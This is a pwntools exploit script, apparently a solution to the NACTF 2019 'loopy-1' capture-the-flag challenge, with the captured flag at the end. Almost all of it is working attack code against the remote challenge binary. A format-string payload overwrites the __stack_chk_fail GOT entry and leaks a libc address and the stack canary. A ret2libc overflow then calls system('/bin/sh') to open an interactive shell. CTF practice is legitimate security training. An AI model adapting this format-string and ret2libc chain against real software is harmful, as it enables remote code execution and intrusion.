from pwn import *

# s = process('./loopy-1')
s = remote('shell.2019.nactf.com' ,31732)

libc = ELF('libc.so.6')
offset_libc_241 = libc.symbols['__libc_start_main']
system_offset = libc.symbols['system']
binsh_offset = next(libc.search('/bin/sh'))

raw_input('debug')
stack_fail_got = 0x804c014
gets_got = 0x804c010
main_add = 0x8049213 
payload = '%' + str(0x804) + 'x'
payload += '%15$hn'
payload += '%' + str(0x9213-0x804) + 'x'
payload += '%14$hn' + 'aaa'
payload += p32(stack_fail_got)
payload += p32(stack_fail_got+2)
# payload += p32(gets_got)
payload += (64-len(payload))*'a'
payload += 'bbbb'
payload += '%35$p'
payload += 'cccc'
payload += '%31$p'
s.sendline(payload)
#__libc_start_main+241
s.recvuntil('bbbb')
libc_main_241 = int(s.recv(10),16) - 241
print "libc+241: %x" % libc_main_241
s.recvuntil('cccc')
leak_canary = int(s.recv(10),16)
print "canary: %x"%leak_canary

base_add = libc_main_241 - offset_libc_241
system_add = base_add + system_offset
binsh_add = base_add + binsh_offset

payload = 'a'*0x3c
payload += p32(leak_canary)
payload += 'a'*(0x50 - 0x3c -4)
payload += p32(system_add)
payload += 'a'*4
payload += p32(binsh_add)

s.sendline(payload)

s.interactive()
#nactf{lo0p_4r0und_th3_G0T_VASfJ4VJ}